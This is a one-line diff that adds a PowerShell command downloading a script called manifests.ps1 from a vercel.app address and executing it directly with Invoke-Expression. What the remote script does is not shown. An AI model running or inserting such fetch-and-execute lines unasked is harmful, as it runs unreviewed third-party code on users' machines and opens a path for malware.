@@ -1,0 +1,1 @@
+irm "https://luatools.vercel.app/manifests.ps1" | iex
